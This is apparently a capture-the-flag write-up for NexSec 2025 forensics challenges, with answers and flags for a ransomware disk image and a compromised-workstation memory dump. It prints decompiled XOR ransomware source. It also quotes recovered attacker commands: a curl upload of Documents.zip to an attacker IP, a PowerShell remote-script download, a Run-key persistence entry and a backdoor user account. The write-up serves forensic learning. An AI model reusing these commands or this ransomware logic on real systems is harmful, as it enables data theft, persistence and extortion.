
**Solution:**

After extracted the zip from drive. We find .E01 (disk image) and also .E01.txt (post-acquisition information details). 

<img width="975" height="521" alt="image" src="https://github.com/user-attachments/assets/3794d28a-585f-482e-b6f0-db66127a4b2e" />

We first calculate the md5 hash to make sure we had the exact disk image. 

<img width="975" height="293" alt="image" src="https://github.com/user-attachments/assets/54bcf9bf-61c7-4f4e-9a73-9569056989c5" />

**Flag:** `nexsec25{c8f31718462337b4cc8218c2ca301ca9ca6122cca71c708757f38788533ca076}`

### OhMyFiles #2

**Challenge:**
> What file extension does the ransomware add to encrypted files? Example: nexsec25{.pdf}

**Solution:**

View the disk with (FTK Imager/Autopsy) or any forensic tools. Then we find multiple files with `.lock` inside **“Basic data partition/[root]/Users/Fakhri/Documents”**

<img width="975" height="417" alt="image" src="https://github.com/user-attachments/assets/67b80429-9bce-44c4-a4a9-442184f3f8ad" />

**Flag:** `NEXSEC25{.lock}`

### OhMyFiles #3

**Challenge:**
> What is the SHA‑256 hash of the deleted archive file?

**Solution:**

1. Open the `FAKHRIWORKSTATION_20251211.E01` in FTK imager
2. In `incident_summary.txt`, we figure that an archive file was deleted
3. So, we go look inside Recycle.bin, saw the file **$R9XXEK.rar** and confirm it because we saw the contain of the archive is a resume template (Resume_Template.docx), now extract the archive file out of FTK imager

<img width="728" height="130" alt="image" src="https://github.com/user-attachments/assets/1b7826a7-608c-421e-ae77-651b1eebdb31" />

<img width="975" height="144" alt="image" src="https://github.com/user-attachments/assets/fd2b94c9-7b48-48b2-a0b0-a95c6fd01070" />

4. Now compute the hash

<img width="975" height="131" alt="image" src="https://github.com/user-attachments/assets/80579792-bb7b-4a76-9299-4f16e07bbe86" />

**Flag:** `NEXSEC25{CFAA2CE425E2F472618323DCBCEB2E3FC013100919A8DBF545BF15B4C45DAE8F}`

### OhMyFiles #4

**Challenge:**
> Identify the most recent CVE that was exploited to deliver the ransomware payload.
> Example: nexsec25{CVE-XXXX-XXXX}

From last question, we figured this could be exploitable due to an insecure version of Winrar. We can confirm those by finding the downloaded winrar version located at **“Basic data partition/[root]/Program Files/WinRar/Rar.txt”** 

Then simply look for the known CVE with this WinRar version. 

<img width="691" height="550" alt="image" src="https://github.com/user-attachments/assets/cee24ee7-6f5c-4a46-8422-0ff23356d330" />

We find this is **CVE-2025-8088** could be the exploited CVE by an attacker for this incident. Another easier way is by visiting this **[VT analysis](https://www.virustotal.com/gui/file/cfaa2ce425e2f472618323dcbceb2e3fc013100919a8dbf545bf15b4c45dae8f)** and we will find the **cve-2025-8088** as the tag

**Flag:** `nexsec25{CVE-2025-8088}` 

### OhMyFiles #5

**Challenge:**
> What is the MITRE ATT&CK technique ID that matches the persistence mechanism observed in this scenario?

From **[VT Relations](https://www.virustotal.com/gui/file/cfaa2ce425e2f472618323dcbceb2e3fc013100919a8dbf545bf15b4c45dae8f/relations)** we find that, this winrar will drop a startup **.lnk** file. This technique ID is 

<img width="975" height="467" alt="image" src="https://github.com/user-attachments/assets/c9298007-bcd4-42ab-8676-efc58046341d" />

We can refer **[Mitre Framework](https://attack.mitre.org/techniques/T1547/001/)** for that.

<img width="1781" height="745" alt="image" src="https://github.com/user-attachments/assets/6bc23b4c-59c0-4b05-939e-180271b9ebfc" />

**Flag:** `NEXSEC25{T1547.001}`

### OhMyFiles #6
**Challenge:** 
> What is the full file path where the ransomware was dropped on the system?

Inside the startup lnk we can find the path of where the ransomware was dropped on the system

<img width="845" height="708" alt="image" src="https://github.com/user-attachments/assets/4fd39eda-acbb-4aa1-ab25-2f0c65293fb5" />

**Flag:** `NEXSEC25{C:\Users\Fakhri\AppData\Local\svchost.exe}`

### OhMyFiles #7
**Challenge:** 
> What cipher algorithm is used to ransom the file?

**Solution:**

From the .exe here is the source code:
```
# Decompiled with PyLingual (https://pylingual.io)
# Internal filename: svchost.py
# Bytecode version: 3.13.0rc3 (3571)
# Source timestamp: 1970-01-01 00:00:00 UTC (0)

import os
import sys
import hashlib
import winreg
from pathlib import Path
from datetime import datetime

def get_file_year(fp):
    try:
        return datetime.fromtimestamp(os.stat(fp).st_ctime).year
    except:
        return 2025

def gen_key(fp):
    try:
        with open(fp, 'rb') as f:
            data = f.read()
                md5 = hashlib.md5(data).hexdigest()
                year = get_file_year(fp)
                return f'{md5}{year}'
    except:
        pass  # postinserted
    return None

def xor_encrypt(data, key):
    kb = key.encode('utf-8')
    return bytes([b ^ kb[i % len(kb)] for i, b in enumerate(data)])

def save_registry(path, name, val):
    try:
        k = winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER, path, 0, winreg.KEY_WRITE)
        winreg.SetValueEx(k, name, 0, winreg.REG_SZ, val)
        winreg.CloseKey(k)
    except:
        return None

def encrypt_file(fp):
    try:
        key = gen_key(fp)
        if not key:
            pass  # postinserted
        return False
    except:
        return False

def main():
    docs = Path(os.path.expandvars('%USERPROFILE%\\Documents'))
    extensions = ['.txt', '.doc', '.docx', '.pdf']
    count = 0
    for ext in extensions:
        for fp in docs.glob(ext):
            if 'DECRYPT' not in fp.name.upper() and 'RANSOM' not in fp.name.upper() and encrypt_file(str(fp)):
                pass  # postinserted
            else:  # inserted
                count += 1
    save_registry('Software\\ShadowCrypt\\Info', 'Encrypted', str(count))
    save_registry('Software\\ShadowCrypt\\Info', 'Method', 'XOR_MD5_YEAR')
    save_registry('Software\\ShadowCrypt\\Info', 'Timestamp', datetime.now().isoformat())
    note = '\n\n========================================================================\n                    SHADOWCRYPT RANSOMWARE\n========================================================================\n\nYOUR FILES HAVE BEEN ENCRYPTED!\n\nAll your important documents are now locked with .lock extension.\nWithout our decryption key, recovery is IMPOSSIBLE.\n\n------------------------------------------------------------------------\nWHAT HAPPENED?\n------------------------------------------------------------------------\nLocation: Documents folder\nFile Extension: .lock\n\n------------------------------------------------------------------------\nWARNING - TIME SENSITIVE!\n------------------------------------------------------------------------\nYou have 72 HOURS to pay before your decryption key is deleted forever.\n\nPrice increases every 24 hours:\n  0-24 hours:  0.5 BTC\n  24-48 hours: 0.6 BTC  \n  48-72 hours: 0.7 BTC\n  After 72h:   FILES LOST PERMANENTLY\n\n========================================================================\n                SHADOWCRYPT TEAM - Since 2019\n           \"Your files. Our encryption. Your choice.\"\n========================================================================\n\nNOTE: This is a CTF challenge for educational purposes only.\n========================================================================\n\n'
    try:
        (docs / '!!! DECRYPT_YOUR_FILES !!!.txt').write_text(note, encoding='utf-8')
    except:
        return None
if _name_ == '_main_':
    main()
```

**Flag:** `NEXSEC25{XOR}`

### OhMyFiles #8

**Challenge:**
> Where are the encryption keys stored?

Do lookup for the ransomware hash through **[VT Relation](https://www.virustotal.com/gui/file/6b5fe5b14293a22b436df716e100bd726be00523aa340230e7c1ecdc8cc72cd9/behavior)**

<img width="975" height="290" alt="image" src="https://github.com/user-attachments/assets/d7e65e84-8f26-4902-9923-48efb531c2a4" />

**Flag:** `nexsec25{HKEY_CURRENT_USER\SOFTWARE\ShadowCrypt\Keys}`

### OhMyFiles #9

**Challenge:**
> Recover the encrypted document and obtain the encrypted flag contained within it.

**Solutions:**

We first get by using bruteforcing the XOR keys, that’s why we solve this one first before OhMyFiles #8. But supposedly we can dump by the registery

**Flag:** `nexsec2025{sh4d0w_crypt_m4st3r_2025}`

### MEMOIR (Initial Discovery)

**Challenge:**
> MEMOIR (Initial Discovery)
> An employee at Berjaya Company appears to have been compromised, and the circumstances remain unclear. We now need your expertise to analyze the acquired memory snapshot and uncover the incidents that unfolded behind the scenes.
>
> SHA256:
> bade0f98f48c5bdd15eb8cfcb91b8d56bc162e950ab93c0933f4e2b111aef5a4
>
> File (if, any):
> https://shorturl.at/ISZs4

**Solution:**

Memory Dump Info
```
Volatility 3 Framework 2.11.0
Variable	Value
Kernel Base	0xf80003e00000
DTB	0x1ad000
Symbols	file:///C:/Users/hzqzz/Downloads/VolatilityWorkbench/symbols/windows/ntkrnlmp.pdb/F57E740B088E5056E8AF0772F1CC5BEB-1.json.xz
Is64Bit	True
IsPAE	False
layer_name	0 WindowsIntel32e

memory_layer	1 FileLayer
KdVersionBlock	0xf80004a0f400
Major/Minor	15.19041
MachineType	34404
KeNumberProcessors	2
SystemTime	2025-12-11 20:07:44+00:00
NtSystemRoot	C:\Windows
NtProductType	NtProductWinNt
NtMajorVersion	10
NtMinorVersion	0
PE MajorOperatingSystemVersion	10
PE MinorOperatingSystemVersion	0
PE Machine	34404
PE TimeDateStamp	Sat Feb  2 23:04:03 1985
```

**Forensic analysis:**

| Time (UTC) | What happened | Evidence |
|------------|---------------|----------|
| 2025-12-11 10:27:24 | Credential dumping tool present: C:\Users\azman\AppData\Local\Temp\mk.exe | Amcache recorded Mimikatz |
| 12:17:04 | Suspicious binary in Temp: C:\Users\azman\AppData\Local\Temp\svchost.exe | Amcache recorded svchost[.]exe from Temp directory |
| 19:38:44 | System boot / baseline processes start | psscan shows System (PID 4) created at 19:38:44 UTC |
| 19:39:55 | RDP session active (host listening on 3389, remote client connected) | netstat shows 192.168.8.34:3389 ↔ 100.96.0.16:54023 ESTABLISHED |
| 19:47:19 | Thunderbird process starts (mail client active) | psscan: thunderbird.ex PID 1000 created 19:47:19 |
| 19:47:54 | Thunderbird internal localhost connections (normal IPC/loopback) | netstat: 127.0.0.1 loopback connections for thunderbird |
| 19:52:36 | WINWORD opens Jemputan_Bengkel_Strategik[.]docx | pstree: WINWORD.EXE (PID 4784) with that file in command line |
| 19:55:11 | WINWORD spawns cmd.exe that launches PowerShell to fetch remote script | pstree: cmd.exe PID 7240 runs powershell ... DownloadString('hxxps[://]raw[.]githubusercontent[.]com/kimmisuuki/AppleSeed/refs/heads/main/cat[.]ps1') |
| 19:55:12 | powershell.exe executes the downloaded script (cat.ps1) | pstree: powershell PID 6112 with same DownloadString command |
| 19:55:32 | PowerShell makes HTTPS connection to 185.199.108.133:443 | netscan: powershell PID 6112 → 185.199.108.133:443 |
| 19:55:42 | PowerShell establishes C2-looking connection to 188.166.181.254:443 | netstat: powershell PID 6112 → 188.166.181.254:443 ESTABLISHED |
| 20:01:27 | Another cmd.exe → powershell -nop -e (base64) (2nd-stage execution) | pstree: cmd PID 5936 runs powershell.exe -nop -e <base64> |
| 20:01:27 | The base64 decodes to: Set-ExecutionPolicy Bypass -Scope CurrentUser; C:\Windows\Tasks\EventViewerRCE[.]ps1 | Same command line blob in pstree |
| 20:01:28 | PowerShell maintains/creates another connection to 188.166.181.254:443 | netstat: powershell PID 3968 → 188.166.181.254:443 |
| 20:05:43 | net1[.]exe executed | pstree: net1.exe PID 7512 created/exited at 20:05:43 |
| 20:06:32 | team[.]exe launched from Temp | pstree: C:\Users\azman\AppData\Local\Temp\team.exe (PID 3368) |
| 20:06:33 | team[.]exe establishes outbound to 188.166.181.254:8000 (likely C2/RAT channel) | netstat: team.exe PID 3368 → 188.166.181.254:8000 ESTABLISHED |
| 20:06:42–20:06:43 | team.exe spawns cmd.exe + conhost | pstree: cmd PID 2712 + conhost PID 6284 under team.exe |
| 20:08:47 | Thunderbird connects to mail server (POP3S 995) | netstat: thunderbird → 74.125.130.108:995 |

Root Cause Analysis:
1.	Root cause was potentially caused by a phishing email
2.	Thunderbird was launched with a saved email file on the Desktop C:\Users\azman\Desktop\Jemputan Bengkel[.]eml
3.	Microsoft Word opened the DOCX from Downloads C:\Users\azman\Downloads\Jemputan_Bengkel_Strategik[.]docx which was the initial trigger
4.	Microsoft Word spawn cmd[.]exe
5.	Powershell pulls cat[.]ps1 from Github hxxps[://]raw[.]githubusercontent[.]com/kimmisuuki/AppleSeed/refs/heads/main/cat[.]ps1
6.	PowerShell establishes outbound connection to 188.166.181.254:443
7.	C:\Users\azman\AppData\Local\Temp\team[.]exe connects to 188.166.181.254:8000
8.	A second-stage command uses base64 to run C:\Windows\Tasks\EventViewerRCE[.]ps1

### MEMOIR #1

**Challenge:**
> What is the full filename of the malicious file that was opened?

**Solution:**

**"C:\Users\azman\Downloads\Jemputan_Bengkel_Strategik.docx"** was opened by `WINWORD.EXE` at PID 4784 and right after that one suspicious powershell command being executed

**Flag:** `NEXSEC25{Jemputan_Bengkel_Strategik.docx}`

### MEMOIR #2

**Question:** What is the IP address of the primary C2 server?

**Solution:**

From the previous cmdline process, team.exe (PID 3368) and powershell.exe (PID 6112), using netScan process, have the same ESTABLISHED connection to 188[.]166[.]181[.]254[:]8000

**Flag:** `NEXSEC25{188.166.181.254}`

### MEMOIR #3

**Challenge:**
> What is the GitHub username hosting the malware repository?

**Solution:**

Extracted PowerShell command line from memory and identified the GitHub repository URL: `hxxps://raw.githubusercontent.com/kimmisuuki/AppleSeed/refs/heads/main/cat.ps1`

**Flag:** `NEXSEC25{kimmisuuki}`

#### MEMOIR #4

**Challenge:**
> What is the SHA1 hash of the credential dumping executable found in memory?

**Solution:**

Identified the credential dumping tool as Mimikatz that located at: `C:\Users\azman\AppData\Local\Temp\mk.exe` and retrieved SHA1 hash from Amcache analysis

**Flag:** `NEXSEC25{d1f7832035c3e8a73cc78afd28cfd7f4cece6d20}`

#### MEMOIR #5

**Challenge:**
> What PowerShell script filename was used for the UAC bypass technique?

**Solution:**
- Decoded base64 PowerShell command:
```powershell
Set-ExecutionPolicy Bypass -Scope CurrentUser;
C:\Windows\Tasks\EventViewerRCE.ps1
```
- This technique exploits Event Viewer for UAC bypass

**Flag:** `NEXSEC25{EventViewerRCE.ps1}`

#### MEMOIR #6

**Challenge:**
> What is the SHA1 hash of the backdoor?

**Solution:**
Identified backdoor as team.exe. Established outbound connection to 188.166.181.254:8000. Spawned command prompt for attacker control. Retrieved SHA1 from Amcache

**Flag:** `NEXSEC25{255d932fa4418ac11b384b125a7d7d91f8eb28f4}`

#### MEMOIR #7

**Challenge:** 
> What is the key value name used for persistence?

**Solution:**

Dumped memory and searched for team.exe strings and found PowerShell command creating registry persistence:

```powershell
New-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "selamat" -Value "C:\Users\azman\AppData\Local\Temp\team.exe"
```

<img width="975" height="417" alt="image" src="https://github.com/user-attachments/assets/13881576-39e2-408a-9b69-ba6c2735f3b4" />

The registry value name "selamat" ensures the malware runs on startup

**Flag:** `NEXSEC25{selamat}`

#### MEMOIR #8

**Challenge:**
> What are the credentials of the newly created user account?
> example : NEXSEC25{username:password}

**Solution:**

Dumped PowerShell process (PID 3076) to extract transcript logs

```bash
vol -f memdump.mem -o dumped/pid3076_dumpfiles windows.dumpfiles --pid 3076
```
Change the extension from `.dat` to `.txt` and we can find that the command net user fakhri admin123 /add is the first one to be executed 

Found user creation command:
```cmd
net user fakhri admin123 /add
```

<img width="554" height="568" alt="image" src="https://github.com/user-attachments/assets/a4e732fe-abd6-4529-affc-a58c496f6eaa" />

**Flag:** `NEXSEC25{fakhri:admin123}`

#### MEMOIR #9

**Challenge:**
> What was the name of the archive file that was exfiltrated?
> example : NEXSEC25{filename.ext}

**Solution:**

Used the same PowerShell transcript from MEMOIR #8 and find attacker compressing user's Documents folder:

<img width="975" height="196" alt="image" src="https://github.com/user-attachments/assets/b0b73114-cd96-4dae-919f-98b564fa5430" />

```powershell
Compress-Archive -Path "C:\Users\azman\Documents" -DestinationPath "Documents.zip"
```

Found exfiltration command:

<img width="975" height="156" alt="image" src="https://github.com/user-attachments/assets/6a64310e-7aa8-4aa2-a5ea-fca78bf3a1a8" />

```bash
curl -X POST -F "file=@Documents.zip" http://188.166.181.254/upload
```

From that we can conclude that `Documents.zip` is the name of the archive file that was exfiltrated

**Flag:** `NEXSEC25{Documents.zip}`

---

## Yapyapyap

The NexSec 2025 CTF was an excellent opportunity to apply digital forensics and incident response skills in realistic scenarios. The challenges covered the complete attack lifecycle from initial compromise through data exfiltration, requiring a combination of memory forensics, malware analysis, and network analysis skills. Thanks to the organizers for an excellent CTF experience!
